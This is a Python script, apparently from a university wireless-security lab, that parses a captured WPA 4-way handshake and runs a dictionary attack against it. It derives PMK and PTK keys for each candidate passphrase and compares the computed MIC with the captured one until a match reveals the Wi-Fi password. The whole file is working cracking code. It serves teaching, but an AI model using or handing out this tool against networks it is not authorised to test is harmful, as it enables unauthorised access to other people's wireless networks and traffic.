#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
- Derive WPA keys from Passphrase and 4-way handshake info

- Calculate an authentication MIC (the mic for data transmission uses the
Michael algorithm. In the case of authentication, we use SHA-1 or MD5)
"""

__author__ = "Abraham Rubinstein"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import hashlib
import hmac
from binascii import a2b_hex, b2a_hex

from pbkdf2 import *
from scapy.all import *


def custom_prf512(key, a, b):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, a + b'\x00' + b + bytes([i]), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


# Read capture file -- it contains beacon, open authentication, associacion, 4-way handshake and data
wpa = rdpcap("wpa_handshake.cap")

# We analyze the capture and take the EAPOL (Handshake packets) in the order of apparition and the beacons to be able to
# get the SSID
list_eapol = []
list_beacons = []
for packet in wpa:
    if packet.haslayer(EAPOL):
        list_eapol.append(packet)
    if packet.haslayer(Dot11):
        list_beacons.append(packet)

# Important parameters for key derivation - some of them can be obtained from the pcap file
a = "Pairwise key expansion"  # this string is used in the pseudo-random function and should never be modified

# We can recover the SSID from the beacon frame
ssid = list_beacons[0].info  # "SWI"

# We can recover here the src MAC of the first handshake frame
ap_mac = a2b_hex(list_eapol[0].addr2.replace(":", ""))

# We can recover the dst MAC of the first handshake frame
client_mac = a2b_hex(list_eapol[0].addr1.replace(":", ""))

# Authenticator and Supplicant Nonces
# The Nonce are on the load of the frame at some exact positions than we can recover by simply get this intervals
a_nonce = a2b_hex(list_eapol[0].load.hex()[26:90])
s_nonce = a2b_hex(list_eapol[1].load.hex()[26:90])

# used in pseudo-random function
b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(a_nonce, s_nonce) + max(a_nonce, s_nonce)

# Take a good look at the contents of this variable. Compare it to the Wireshark last message of the 4-way handshake.
# In particular, look at the last 16 bytes. Read "Important info" in the lab assignment for explanation
# We can see that the mic is all 0 so we've done something dirty to not get it and adjust the length of the data to left
# with 0
# We need to recover some things about the Authentication frames
data = ("{0:#0{1}x}".format(list_eapol[3]["EAPOL"].version, 4)[2:] +
        "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].type, 4)[2:] +
        "{0:#0{1}x}".format(list_eapol[3]["EAPOL"].len, 6)[2:] +
        list_eapol[3].load.hex()[:153]).ljust(198, '0')
data = a2b_hex(data)

# Le champ Key Information est sur 2 bytes. Il y a 1 byte avant ces 2 là (Key Descriptor Type) qui ne nous intéresse
# pas. Du champ Key Information, seul les 2 premiers bits (Key Descriptor Version) nous intéresse. Il indique
# l'algorithme de hashage utilisé pour calculer le MIC. 1: HMAC-MD5 ; 2: HMAC-SHA1-128.
key_desc_version = list_eapol[3]['EAPOL'].load[2] & 0x03
hash_algo = hashlib.md5 if key_desc_version == 1 else hashlib.sha1

# This is the MIC contained in the 4th frame of the 4-way handshake. I copied it by hand.
# When trying to crack the WPA passphrase, we will compare it to our own MIC calculated using passphrases from a
# dictionary.txt
# Same as the Nonces it's on some interval on the load of the last Handshake
mic_to_test = list_eapol[3].load.hex()[154:-4]  # "36eef66540fa801ceee2fea9b7929b40"

# Here we load our dictionnary and put it on a list to test each word
words = [word.rstrip('\n') for word in open("dictionary.txt")]
success = False

for word in words:
    print("\n\nValues used to derivate keys")
    print("============================")
    print("Passphrase:\t", word)
    print("SSID:\t\t", ssid)
    print("AP MAC:\t\t", b2a_hex(ap_mac))
    print("Client MAC:\t", b2a_hex(client_mac))
    print("AP Nonce:\t", b2a_hex(a_nonce))
    print("Client Nonce:\t", b2a_hex(s_nonce))

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    word = str.encode(word)
    pmk = pbkdf2(hashlib.sha1, word, ssid, 4096, 32)

    # expand pmk to obtain PTK
    ptk = custom_prf512(pmk, str.encode(a), b)

    # calculate MIC over EAPOL payload (Michael) - The ptk is, in fact, KCK|KEK|TK|MICK
    # Si l'algo est HMAC-SHA1 on prend les 128 premiers bits des 160 de sortie,
    # si c'est HMAC-MD5, la sortie fait déjà 128 bits.
    mic = hmac.new(ptk[0:16], data, hash_algo).hexdigest()[0:32]

    print("\nResults of the key expansion")
    print("============================")
    print("PMK:\t\t", pmk.hex())
    print("PTK:\t\t", ptk.hex())
    print("KCK:\t\t", ptk[0:16].hex())
    print("KEK:\t\t", ptk[16:32].hex())
    print("TK:\t\t", ptk[32:48].hex())
    print("MICK:\t\t", ptk[48:64].hex())
    print("MIC:\t\t", mic)
    print("MIC to test:\t", mic_to_test)

    if mic == mic_to_test:
        print("Success! With this passphrase " + str(word))
        success = True
        break

if not success:
    print("No passphrase match")
